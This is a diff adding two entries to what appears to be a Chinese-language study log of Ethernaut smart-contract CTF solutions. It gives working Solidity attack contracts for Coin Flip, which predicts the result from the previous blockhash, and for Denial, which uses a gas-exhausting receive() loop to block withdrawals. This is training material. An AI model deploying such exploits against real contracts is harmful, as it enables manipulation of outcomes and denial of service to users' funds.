@@ -236,5 +236,52 @@ contract SwappableTokenTwo is ERC20 {
 }
 ```
 
+### 2024.09.10
+#### Ethernaut - Coin Flip
+可以部署一个合约，提前算出这个回合的值，然后再调用目标合约
+实例地址：0xC4942cA0C3cF779AE244026Bd5768a79bC93FA91
+```
+contract AttackCoinFlip {
+    CoinFlip flip;
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _flip) {
+        flip = CoinFlip(_flip);
+    }
+
+    function attack() public {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        bool res = flip.flip(side);
+        if (!res) {
+            revert();
+        }
+    }
+}
+```
+### 2024.09.11
+#### Ethernaut - Denial
+题目专门提示了 gas 费不超过 1M。然后看下合约，通过 call 方法调用 partner。
+call 会默认调用partner的 receive方法，只需要目标合约的 receive 方法为死循环，就能让 withdraw 方法失效。
+实例地址：0x91c906F8d655A90601805B71745f454742c38632
+```
+contract AttackDenial {
+    receive() external payable {
+        for (uint256 i = 1; i<10000000000; i++) {
+            if (i == 100) {
+                i = 10;
+            }
+        }
+    }
+}
+```
+
 
 <!-- Content_END -->
